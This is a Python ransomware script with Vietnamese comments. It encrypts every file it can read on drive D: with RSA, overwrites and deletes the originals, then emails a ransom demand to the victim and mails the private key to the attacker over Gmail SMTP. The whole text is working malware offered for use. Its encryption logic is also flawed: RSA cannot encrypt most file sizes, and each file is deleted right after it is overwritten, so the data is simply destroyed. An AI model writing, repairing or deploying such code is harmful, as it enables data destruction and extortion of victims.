from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email import encoders
import os
import smtplib

# Generate public/private key pair
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)
public_key = private_key.public_key()

drive = "D:\\"
for root, dirs, files in os.walk(drive):
    for filename in files:
        input_file = os.path.join(root, filename) # duong dan file goc
        rel_path = os.path.relpath(input_file, drive) # duong dan tu goc den file
        output_file = os.path.join("Encrypted", rel_path + ".encryp") # duong dan file sau khi ma hoa   
        try:
            with open(input_file, 'rb') as f:
                content = f.read()
            # Encrypt the file data
            encrypted = public_key.encrypt(
                content,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),  
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            # Write the encrypted data back to the file
            with open(input_file, 'wb') as f:
                f.write(encrypted)
                os.remove(input_file)
        except Exception as e:
            # Skip files that cannot be read or written
            continue

# Save private key
pem = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()
)
with open('privatekey.pem', 'wb') as f:
    f.write(pem)

# Send email notification
fromAddr = ""     #dia chi email thu pham 
toAddr = "" #dia chi email nan nhan
mail_nhan_key = "" #diachi nhan private key

msg = MIMEMultipart()
msg['From'] = fromAddr
msg['To'] = toAddr
msg['Subject'] = "Hacked!!! Dua tien day !!!"
body = "Muon lay lai du lieu thi chuyen tien cho khoihn voi stk ngan hang la: ABCXYZ!!!"
msg.attach(MIMEText(body, 'plain'))

# gửi email file private key cho hacker 
msg_key = MIMEMultipart()
msg_key['From'] = fromAddr
msg_key['To'] = mail_nhan_key
msg_key['Subject'] = "Private Key File"
with open('privatekey.pem', 'rb') as f:
    part = MIMEBase('application', 'octet-stream')  #application/octet-stream ( txt, pdf, docx, xlsx, pptx, zip, rar, png, jpg, mp3, mp4 ...)
    part.set_payload(f.read())    # read private key file
    encoders.encode_base64(part)  # decode base 64
    msg_key.attach(part) 

server = smtplib.SMTP('smtp.gmail.com', 587)  
server.starttls() 
server.login(fromAddr, "*****") # use app password
server.sendmail(fromAddr, toAddr, msg.as_string())  # gui mail tong tien
server.sendmail(fromAddr, mail_nhan_key, msg_key.as_string())  # mail private cho hacker
server.quit() 


